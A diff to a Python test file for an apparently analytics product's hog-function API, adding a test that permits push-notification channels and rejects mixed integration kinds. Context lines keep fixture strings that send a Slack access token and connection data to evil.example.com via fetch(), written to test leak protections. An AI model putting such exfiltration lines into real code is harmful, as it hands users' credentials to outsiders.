@@ -109,6 +109,10 @@ SLACK_SENDER_HOG = (
 SLACK_LEAKING_HOG = "fetch('https://evil.example.com', {'body': inputs.slack_workspace.access_token});"
 CONNECTION_LEAKING_HOG = "fetch('https://evil.example.com', {'body': inputs.conn});"
 GITLAB_TOKEN_SENDER_HOG = "fetch(f'{inputs.conn.hostname}/api', {'body': inputs.token});"
+PUSH_SENDER_HOG = (
+    "let res := sendPushNotification({'integrationIds': arrayMap(c -> c.$integration_id, inputs.channels), "
+    "'payload': {'title': 'Hi'}})\nif (not res.success) { throw Error(f'Push failed: {res.error}') }"
+)
 PAGEVIEW_FILTERS = {"events": [{"id": "$pageview", "name": "$pageview", "type": "events", "order": 0}]}
 
 
@@ -1840,6 +1844,51 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
 
         assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
         assert (res.json()["attr"], res.json()["code"]) == (expected_attr, expected_code)
+
+    @parameterized.expand(
+        [
+            ("push_channels", ["firebase", "apns"], status.HTTP_200_OK),
+            ("channel_of_a_kind_without_push", ["firebase", "slack"], status.HTTP_400_BAD_REQUEST),
+        ]
+    )
+    def test_connection_handed_to_a_worker_function(self, _name: str, kinds: list[str], expected_status: int) -> None:
+        HogFunctionTemplate.objects.create(
+            template_id="template-push-test",
+            sha="1.0.0",
+            name="Push",
+            description="Internal building block",
+            code=PUSH_SENDER_HOG,
+            code_language="hog",
+            inputs_schema=[],
+            type="destination",
+            status="hidden",
+            category=["Other"],
+            free=True,
+        )
+        ids = [
+            Integration.objects.create(
+                team=self.team, kind=kind, sensitive_config={"key": "k"}, created_by=self.user
+            ).id
+            for kind in kinds
+        ]
+        function = HogFunction.objects.create(
+            team=self.team,
+            name="Push step",
+            type="destination",
+            template_id="template-push-test",
+            enabled=False,
+            hog=PUSH_SENDER_HOG,
+            inputs_schema=[{"key": "channels", "type": "integration_multi", "integration": "firebase,apns"}],
+            inputs={"channels": {"value": ids}},
+        )
+
+        with secret_host_binding_flag(True):
+            res = self.client.patch(
+                f"/api/projects/{self.team.id}/hog_functions/{function.id}",
+                data={"hog": PUSH_SENDER_HOG.replace("'Hi'", "'Hello'")},
+            )
+
+        assert res.status_code == expected_status, res.json()
 
     @parameterized.expand(
         [("disable", {"enabled": False}), ("delete", {"deleted": True}), ("rename", {"name": "Renamed"})]
